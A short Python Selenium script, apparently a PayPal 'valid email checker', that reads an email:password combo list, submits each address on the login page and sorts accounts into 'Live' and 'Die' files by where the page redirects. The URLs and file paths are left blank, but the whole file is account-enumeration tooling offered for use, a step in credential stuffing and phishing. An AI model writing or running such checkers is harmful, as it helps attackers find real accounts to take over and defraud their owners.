from selenium import webdriver   
from selenium.webdriver.support.ui import WebDriverWait  
from selenium.webdriver.chrome.options import Options 
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By 
from selenium.webdriver.chrome.options import Options
import time




# Creating text documents
live = open('.txt', 'w')
die = open('.txt', 'w')

# Taking the mail list from the user
list_inp = raw_input("Input Mail List :")
list = open(list_inp, 'r')
print("-"*55)


# Opening the browser
driver = webdriver.Chrome('') #Write your own path here...

while True:
   
    
# Choose mails from the list
    email = list.readline().replace('\n','')
    if not email:
        break 
    bacot = email.strip().split(':')
    real_mail = str(bacot[0])
    

# Go to Paypal's website and enter the mail address    
    driver.get("")
    
    timeout_email = 5 #Seconds
    mail_present = EC.presence_of_element_located((By.ID, 'email'))
    WebDriverWait(driver, timeout_email).until(mail_present)
    
    found_mail = driver.find_element_by_id("email")
    found_mail.send_keys(real_mail)
    driver.find_element_by_id("continueButton").click()
    
    time.sleep(1)
    
# Getting the redirected link and checking if the account is valid or not.
    current = driver.current_url
    
    if current == '':
        print("\033 Live | "+real_mail+" | [(Checked)]")
        live.write(real_mail + '\n')
    else:
        print("\033 Die | "+real_mail+" | [(Checked)]")
        die.write(real_mail + '\n')
        
    
    driver.refresh()        
    
# More show... (and quit)
print("-"*50)
print("\033 Checking Done \033")
print("Valid Email was Saved in Live.txt")
driver.quit()
    

    

